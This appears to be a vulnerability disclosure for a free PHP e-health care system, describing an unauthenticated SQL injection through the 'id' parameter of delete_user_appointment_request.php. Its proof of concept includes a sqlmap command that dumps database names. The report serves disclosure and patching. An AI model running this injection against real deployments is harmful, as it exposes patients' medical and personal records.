# E-Health Care System IN PHP has sql injection vulnerability via delete_user_appointment_request.php

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
delete_user_appointment_request.php
## describe
No authentication or permissions are required，an unrestricted SQL injection attack exists in delete_user_appointment_request.php of  E-Health Care System . The parameters that can be controlled are as follows: $_GET['id'] . This function executes the $id  parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

## code analysis
The $id parameters of the delete_user_appointment_request.php  are not filtered and concatenated into the SQL statement for execution.

![image-20241105120045938](https://github.com/user-attachments/assets/4d20d2ba-27a1-4bb0-86ca-33e0beae9697)



## POC

this is vulnerable url.

```
http://healthcare/Doctor/delete_user_appointment_request.php?id=1
```

excute the sqlmap command to get dbs.

```
 python sqlmap.py -u "http://healthcare/Doctor/delete_user_appointment_request.php?id=1" -p "id" --dbs
```

see the results.

get Sensitive database name：information_schema,bloodbank,crud...

![image-20241105120313329](https://github.com/user-attachments/assets/ddff18cb-f46c-4d7a-94be-25dac43e09ab)